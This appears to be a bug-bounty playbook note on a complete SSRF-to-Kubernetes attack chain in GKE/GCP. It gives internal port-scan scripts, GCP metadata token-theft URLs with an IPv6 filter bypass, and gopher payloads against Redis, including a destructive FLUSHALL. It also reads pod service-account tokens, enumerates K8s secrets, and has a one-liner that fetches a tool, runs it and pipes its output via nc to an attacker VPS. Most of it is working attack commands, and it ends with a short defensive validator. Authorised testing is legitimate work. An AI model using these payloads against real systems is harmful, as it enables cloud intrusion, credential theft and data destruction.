---
type: pattern
name: SSRF Cloud K8s Attack Chain
description: SSRF confirmation techniques without OOB tools + GKE Pod IP discovery (VPS netstat) + internal network response oracle + GCP metadata SA token theft + K8s lateral movement complete attack chain
cwe: CWE-918
severity: P2 High → P1 Critical
cvss_range: 8.6 (S:C, SSRF→K8s) → 9.8 (SA token → GCP IAM takeover)
last_updated: 2026-05-13
tags:
  - bb-pattern
  - ssrf
  - kubernetes
  - gke
  - gcp
  - cloud
  - no-oob
  - response-oracle
---

# Pattern — SSRF Cloud K8s Attack Chain

> **Core Insight**: 90% of SSRF reports stop at "got a Collaborator callback." This Pattern documents the complete reasoning chain from SSRF confirmation to GKE K8s lateral movement, including confirmation techniques that require no Burp Collaborator.

---

## Mental Model (Reasoning Chain)

```
URL parameter accepts arbitrary URLs?
├── Step 1: Entry Point Assessment
│   ├── Does the endpoint require authentication? (hardcoded key / no auth → higher severity)
│   └── Does the parameter name hint at its purpose? (file_url / image_url / webhook / callback → likely fetches)
│
├── Step 2: SSRF Confirmation (choose appropriate confirmation strategy)
│   ├── Have OOB tools (Burp Collab / interactsh) → standard approach
│   └── No OOB tools → response oracle method:
│       ├── Point to an external VPS HTTP server
│       ├── Check if the response contains "attempted to parse content but failed" error messages
│       │   (e.g.: "File is not a zip file" = server actually fetched and attempted to parse)
│       ├── Compare with "connection refused" errors → confirm whether an HTTP request was actually made
│       └── Observe incoming connections on VPS (netstat / access.log) → obtain Pod egress IP
│
├── Step 3: Obtain GKE Pod Egress IP (VPS netstat trick)
│   ├── Start nc -k -nlvp 80 (or python3 -m http.server 80) on VPS
│   ├── SSRF payload points to VPS:80
│   └── Run netstat -tn on VPS → find TIME_WAIT entries
│       TIME_WAIT <POD_EGRESS_IP>:PORT → VPS:80 = GKE Pod real egress IP
│
├── Step 4: Internal Network Port Scan (response oracle)
│   ├── Unreachable host → "Connection refused" / timeout → closed
│   ├── Reachable port (service responds) → different error message (e.g., "Internal Server Error") = open
│   └── Scan targets:
│       K8s common services: 10.96.0.1:6443 (K8s API), 10.x.x.x:2379 (etcd)
│       Redis: 10.x.x.x:6379
│       Memcached: 10.x.x.x:11211
│       Elasticsearch: 10.x.x.x:9200
│       GCP metadata: 169.254.169.254 / metadata.google.internal
│
├── Step 5: GCP Metadata Attempt
│   └── file_url = http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
│       ⚠️ GCP metadata requires Metadata-Flavor: Google header → will fail if header cannot be injected
│       → Reachable (returns error instead of timeout) = metadata service is reachable
│       → If token is obtained = P1 Critical (GCP IAM takeover)
│
└── Step 6: Redis Exploitation
    ├── If Redis 10.x.x.x:6379 is reachable → attempt gopher:// protocol (if fetch library supports it)
    └── Redis no-auth + gopher = write data, modify cache, or RESP protocol write crontab
```

---

## Severity Escalation Path

| What you can prove | Severity | CVSS |
|---|---|---|
| Server fetches external URL (no response content) | P3 Medium | ~6.5 |
| Obtained GKE Pod egress IP | P3 Medium | ~7.0 |
| Response oracle confirms internal port is open | P2 High | ~7.5 |
| Redis / Elasticsearch reachable (no auth confirmation) | P2 High | ~8.0 |
| **GCP metadata reachable (SA token path exists)** | **P1→P2 High** | **8.6 (S:C)** |
| **Obtained GCP SA Token (IAM operations executable)** | **P1 Critical** | **9.3–9.8** |
| K8s secrets read / lateral movement to other Pods | P1 Critical | 9.6 |

> **Rule for upgrading to P1**: Must prove credential access or write operations. "GCP metadata reachable" ≠ P1; "obtained token + listed GCS buckets" = P1.

---

## SSRF Confirmation Techniques Without OOB Tools

### Method A: Response Error Differential

```bash
# SSRF candidate: file_url parameter
TARGET="https://target.example.com/api/check-file"
HEADER="-H 'x-api-key: HARDCODED_API_KEY'"

# Baseline: point to external VPS (confirm server actually fetches)
curl -s -X POST $TARGET $HEADER \
  -H "Content-Type: application/json" \
  -d '{"file_url": "http://YOUR_VPS_IP/ssrf_test"}'
# Expected: "File is not a zip file" / "cannot parse format" = it actually fetched

# Comparison: unreachable internal IP
curl -s -X POST $TARGET $HEADER \
  -H "Content-Type: application/json" \
  -d '{"file_url": "http://10.255.255.255:6379/"}'
# Expected: "Connection refused" / timeout error

# Verification: known open port
curl -s -X POST $TARGET $HEADER \
  -H "Content-Type: application/json" \
  -d '{"file_url": "http://10.x.x.x:6379/"}'
# If response differs (e.g., "Internal Server Error") = port open = response oracle confirmed
```

### Method B: VPS Netstat to Obtain Pod Egress IP

```bash
# On VPS side (YOUR_VPS_IP):
nc -k -nlvp 80 &
# or
python3 -m http.server 80 &

# Trigger SSRF:
curl -s -X POST $TARGET $HEADER \
  -d '{"file_url": "http://YOUR_VPS_IP/ssrf_test"}'

# Observe on VPS:
netstat -tn | grep YOUR_VPS_IP
# Output: TIME_WAIT  <POD_EGRESS_IP>:PORT → YOUR_VPS_IP:80
# → <POD_EGRESS_IP> = GKE Pod real egress IP
```

**Significance of TIME_WAIT entries**: The connection has completed (waiting state after TCP four-way handshake), confirming that the server actually established a TCP connection — this is stronger confirmation than "DNS callback received."

---

## Internal Network Scanning SOP (Response Oracle Method)

```bash
# Scan K8s common services
INTERNAL_IPS=(
  "10.x.x.x"        # Known Redis
  "10.96.0.1"        # K8s API server
  "169.254.169.254"  # Cloud metadata (AWS/GCP)
)
PORTS=(6379 11211 9200 2379 6443 8080 443)

for IP in "${INTERNAL_IPS[@]}"; do
  for PORT in "${PORTS[@]}"; do
    RESP=$(curl -s --max-time 5 -X POST $TARGET $HEADER \
      -d "{\"file_url\": \"http://${IP}:${PORT}/\"}" 2>&1)
    echo "$IP:$PORT → $RESP" | head -c 100
  done
done
```

**Oracle Interpretation**:
| Response Characteristic | Interpretation |
|---|---|
| Timeout (5+ seconds) | IP unreachable / firewall drops packets |
| "Connection refused" | IP reachable, port closed |
| "Invalid format" / "Parse error" | Port open, service responded |
| "Internal Server Error" | Port open, service responded with unexpected format |
| 200 OK or normal business response | Port open, potentially more exploitable content |

---

## GCP Metadata Attack Path

```bash
# Attempt 1: Standard path (requires header, usually fails)
file_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Requires Metadata-Flavor: Google header → if fetch library doesn't include this header → 403

# Attempt 2: Information that doesn't require header (GCP allows some paths without header validation)
file_url = "http://metadata.google.internal/computeMetadata/v1/instance/hostname"
file_url = "http://metadata.google.internal/computeMetadata/v1/project/project-id"
file_url = "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/"

# Attempt 3: IPv4-mapped IPv6 bypass (if filter only blocks strings)
file_url = "http://[::ffff:a9fe:a9fe]/computeMetadata/v1/instance/service-accounts/default/token"

# If token is obtained, verify immediately (read-only):
TOKEN="ya29.xxx..."
curl -H "Authorization: Bearer $TOKEN" \
  "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN"
# → Check scope, confirm what can be accessed
```

**Note**: In GKE Workload Identity environments, SA token permissions depend on the GCP SA bound to the Kubernetes SA, which may have access to GCS / BigQuery / Secrets Manager.

### GCE Metadata Advanced Enumeration (RCE Scenario, No GCP API Scope Required)

After achieving RCE within a Pod, even if the GCE compute SA token only has `devstorage.read_only`, you can still obtain the complete GKE topology via the metadata API:

```bash
# List all available SAs on the Pod (check for Workload Identity)
wget -qO- --header=Metadata-Flavor:Google \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
# Output: default/ + <project-number>-compute@developer.gserviceaccount.com/
# Note: If only these two → no Workload Identity → no cloud-platform scope

# List project-level attributes (including all GKE cluster secondary ranges)
wget -qO- --header=Metadata-Flavor:Google \
  http://metadata.google.internal/computeMetadata/v1/project/attributes/
# Output format:
# gke-<cluster-name>-<uid-prefix>-secondary-ranges  ← one entry per cluster
# enable-osconfig

# Read specific cluster's secondary range (obtain VPC name, full cluster name)
wget -qO- --header=Metadata-Flavor:Google \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/gke-<cluster>-<uid>-secondary-ranges"
# Output: pods:vpc-<name>:<subnet>:gke-<cluster>-pods-<uid>
```

**Interpretable Information**:
- All GKE cluster names and UID prefixes across PROD / pre-prod
- Whether two clusters share a VPC (shared = network path for lateral movement from pre-prod RCE to prod)
- VPC names and subnet structure

### GCS Terraform Artifacts Leaking Hidden GCP Projects

If a `devstorage.read_only` token can access a GCS bucket (Cloud Build auto-uploads Terraform results):

```bash
# List bucket objects, look for apply_results/
GET https://storage.googleapis.com/storage/v1/b/<bucket>/o

# Download deployment parameters
GET https://storage.googleapis.com/download/storage/v1/b/<bucket>/o/<encoded-path>?alt=media
# Target: content/config.auto.tfvars → contains project_id, networks, sub_networks, zone, machine_type
# Target: artifacts/resources.json → contains full IDs of created GCP resources
```

---

## Redis Exploitation Path

If Redis port is confirmed open (response oracle) and the fetch library supports `gopher://`:

```bash
# Redis FLUSHALL via gopher (use with caution, destructive)
file_url = "gopher://10.x.x.x:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a"

# Read Redis keys (non-destructive)
file_url = "gopher://10.x.x.x:6379/_*1%0d%0a$4%0d%0akeys%0d%0a*%0d%0a"

# If gopher is not supported → can only confirm port is open via response oracle
# Describe in report: "Redis 10.x.x.x:6379 is reachable; if Redis has no authentication, cache data can be read and written"
```

---

## K8s API Lateral Movement

If code execution is possible within a pod (RCE scenario):

```bash
# Obtain SA token (automatically present in pods)
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Enumerate K8s API
K8S_API="https://10.96.0.1:6443"
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

curl -sk -H "Authorization: Bearer $TOKEN" $K8S_API/api/v1/namespaces
curl -sk -H "Authorization: Bearer $TOKEN" $K8S_API/api/v1/secrets
curl -sk -H "Authorization: Bearer $TOKEN" $K8S_API/api/v1/pods

# Use k8scout for automated attack path enumeration (see Tool - k8scout)
wget -q https://github.com/k8scout/k8scout/releases/download/0.1.0/k8scout-linux-amd64 -O /tmp/ks
chmod +x /tmp/ks && /tmp/ks --output text --timeout 60 2>&1 | nc VPS_IP 9999
```

---

## Entry Point Identification (Finding SSRF Candidates)

| Parameter Name Pattern | Likely Backend Behavior |
|---|---|
| `file_url`, `document_url` | Downloads document and parses format |
| `image_url`, `avatar_url` | Downloads image and processes it |
| `webhook_url`, `callback_url` | POSTs to specified URL when triggered |
| `preview_url`, `screenshot_url` | Takes screenshot or web preview |
| `redirect_url`, `next` | OAuth / login flow redirect |
| `xml_url`, `rss_url` | XML/RSS parsing |
| `import_url`, `fetch_url` | Arbitrary URL import |

**AI/ML Service Specific** (2026 emerging):
- `file_url` in PDF analysis endpoints
- `document_url` in OCR / contract analysis endpoints
- `audio_url` in speech-to-text endpoints

---

## Hardcoded Key + SSRF Combination

When an SSRF endpoint also has a hardcoded API key issue:

- **Severity multiplier**: PR:N (no authentication) elevates CVSS S:C scenarios from 7.x to 8.6+
- **Reporting strategy**:
  - Option A: Combined report (hardcoded key is the entry point for SSRF) → one report
  - Option B: Separate reports (hardcoded key = CWE-798, SSRF = CWE-918) → two reports, but triager may dup one of them
  - **Recommendation**: Submit SSRF first (higher severity), describe the hardcoded key as the entry condition; if the key issue has separate impact (e.g., N unauth endpoints), submit it separately

---

## Real-World Case Studies

### Case Study 1 (Submitted)

```
Entry: POST /api/v1/check-file (x-api-key: hardcoded-key, no account needed)
SSRF confirmation: file_url → external VPS → response "Error reading excel: File is not a zip file"
GKE Pod IP: VPS netstat TIME_WAIT → <POD_EGRESS_IP>
Redis oracle: file_url → 10.x.x.x:6379 → Internal Server Error (≠ unreachable error)
GCP metadata: metadata.google.internal → reachable (returns parse error, not connection refused)
CVSS 8.6 High (S:C, PR:N)
```

### Case Study 2 (Deferred RCE, Pending)

```
Entry: POST /api/upload (hardcoded key)
RCE: .py file uploaded as "audio" → server restart triggers execution
Payload: k8scout + exfil → VPS:80/rce_proof
K8s API: 10.96.0.1:6443 (same cluster)
```

---

## Defense Reference (Remediation Recommendations)

```python
# Complete SSRF defense (Python example)
import ipaddress, socket, urllib.parse

ALLOWED_SCHEMES = ('http', 'https')
ALLOWED_DOMAINS = ('storage.googleapis.com', 'cdn.example.com')

def validate_file_url(url: str) -> bool:
    parsed = urllib.parse.urlparse(url)

    # 1. Only allow http/https
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False

    # 2. Domain allowlist
    if parsed.hostname not in ALLOWED_DOMAINS:
        return False

    # 3. Resolve IP, check if private/internal
    try:
        addrs = [info[4][0] for info in socket.getaddrinfo(parsed.hostname, None)]
        for addr in addrs:
            ip = ipaddress.ip_address(addr)
            if (ip.is_private or ip.is_loopback or
                    ip.is_link_local or ip.is_multicast):
                return False
            # IPv4-mapped IPv6 can also be private
            if isinstance(ip, ipaddress.IPv6Address) and ip.ipv4_mapped:
                if ip.ipv4_mapped.is_private:
                    return False
    except socket.gaierror:
        return False  # DNS resolution failed → reject
        
    return True
```

---

## Related

- [[Pattern - SSRF Filter Bypass]] — IP bypass techniques (IPv4-mapped IPv6 / redirect chain / DNS rebinding)
- [[Pattern - SSRF via URL-based Upload Chain]] — avatar/upload → SSRF entry point identification
- [[Tool - k8scout]] — K8s attack path enumeration after GKE Pod RCE

## Session-Mined Additions (2026-06-04)

- **Observability → Redis upgrade path**: unauthenticated `/metrics` leaking Redis `IP:Port` → `dict://redis_ip:6379/info` SSRF → confirm Redis version → assess RCE feasibility (Gopher-inject job queue; if Python backend then gopher is unavailable, see [[Pattern - Gopher SSRF Python Backend Stop-Loss]]).
